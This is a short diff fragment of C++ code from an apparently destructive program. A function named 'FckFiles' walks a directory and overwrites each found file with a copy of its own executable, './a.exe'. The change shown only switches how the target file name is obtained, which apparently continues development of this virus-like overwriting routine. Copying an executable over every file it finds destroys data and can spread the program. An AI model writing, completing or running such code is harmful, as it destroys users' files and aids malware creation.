@@ -36,7 +36,7 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
 		{
 			Chain = Chain + sWords[rand() % 4];
 			cout << Chain;
-			CopyFile("./a.exe",entry.path().string().c_str(),0);
+			CopyFile("./a.exe",FindFileData.cFileName,0);
 		}
 		else
 		{
